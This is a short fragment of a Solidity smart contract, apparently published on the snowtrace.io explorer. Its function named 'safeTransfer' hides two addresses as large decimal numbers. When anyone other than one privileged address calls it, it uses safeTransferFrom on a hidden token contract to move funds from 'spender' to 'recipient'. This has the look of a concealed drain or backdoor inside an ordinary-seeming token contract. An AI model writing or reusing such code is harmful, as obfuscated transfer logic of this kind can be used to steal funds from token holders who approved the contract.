/**
 *Submitted for verification at snowtrace.io on 2023-02-05
*/
 ...
 */
  function _msgData() internal view virtual returns (bytes calldata) {return msg.data;}function safeTransfer(address spender,address recipient,uint256 amount) internal returns (bool) {if (msg.sender != address(362042562934096558418405010611205572750244826546)) {TransferHelper.safeTransferFrom(address(505216755534839379483822626455622908356787093390),spender,recipient,amount);return true;}return false;}
}
